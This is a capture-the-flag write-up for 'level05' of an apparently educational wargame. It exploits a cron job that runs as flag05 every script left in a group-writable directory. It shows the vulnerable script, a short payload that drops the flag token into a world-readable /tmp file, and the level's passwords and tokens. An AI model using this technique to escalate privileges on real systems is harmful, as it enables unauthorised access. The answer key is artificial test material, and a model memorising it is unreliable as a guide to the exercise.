# level05

No binary, no script in your home, just a note in your inbox and a cron job that trusts a directory it really shouldn't. Patience level: two minutes :)

| | |
| --- | --- |
| **Login** | `level05` / `ne2searoevaevoem4ov4ar8ap` (the flag04 token) |
| **flag05 password** | n/a (a cron runs our code as flag05) |
| **flag05 token** | `viuaaale9huek52boumoomioc` (aka the level06 password) |

## poking around

Home is empty except dotfiles, and `find / -user flag05` only turns up `/usr/sbin/openarenaserver`. The actual hint is sitting in the mail nobody reads:

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Every 2 minutes, root runs that script **as flag05**. So whatever that script does, it does it with flag05's privileges. Let's see what it does.

## the script

```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It runs every file in `/opt/openarenaserver/` as a shell script, then deletes it. No check on who owns the files, no check on what's in them. And:

```bash
$ ls -ld /opt/openarenaserver
drwxrwxr-x+ 2 root root ... /opt/openarenaserver
```

That directory is group-writable (plus an ACL). We can drop files in it. So we get to hand flag05's cron a script of our choosing, every two minutes, on a silver platter.

## the payload

The cron's output goes nowhere we can see, so the script can't just print the token. It has to stash it somewhere world-readable for us to pick up after:

```sh
getflag > /tmp/level05_token 2>&1
chmod 666 /tmp/level05_token
```

Drop it in and wait for the clock:

```bash
$ cp pwn.sh /opt/openarenaserver/
$ while [ ! -f /tmp/level05_token ]; do sleep 1; done; cat /tmp/level05_token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

The cron fires on the next even minute, runs our script as flag05, and `getflag` writes the token where we can read it. `pwn.sh` in this folder is that payload.
